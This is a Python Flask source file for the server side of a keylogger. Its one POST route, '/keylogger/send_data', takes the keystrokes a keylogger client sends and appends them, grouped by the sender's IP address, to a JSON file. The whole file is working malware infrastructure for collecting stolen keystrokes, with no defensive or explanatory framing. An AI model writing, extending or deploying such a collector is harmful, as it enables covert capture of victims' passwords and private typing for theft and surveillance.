
from flask import Blueprint, request
import json
from typing import List
import os
keylog: Blueprint = Blueprint('keylog', __name__, None)


@keylog.route('/keylogger/send_data', methods=['POST'])
def record() -> dict:
    """
    A POST route to allow a key logger to send its data to the server.

    Return:
    A dict, with a key for the response. 0 if successful.
    """
    data: dict = json.loads(request.json)

    ip: str = request.remote_addr
    letters: List[str] = data['keys_pressed']

    data_file: str = "data/keylog.json"
    if os.path.exists(data_file):
        with open(data_file, "r") as fp:
            data = json.load(fp)
    else:
        data = {}

    previous_keys: List[str] = None
    if ip in data.keys():
        previous_keys = data[ip]
    else:
        previous_keys = []

    previous_keys.extend(letters)
    data[ip] = previous_keys

    with open(data_file, "w+") as fp:
        json.dump(data, fp)

    return {"response": 0}
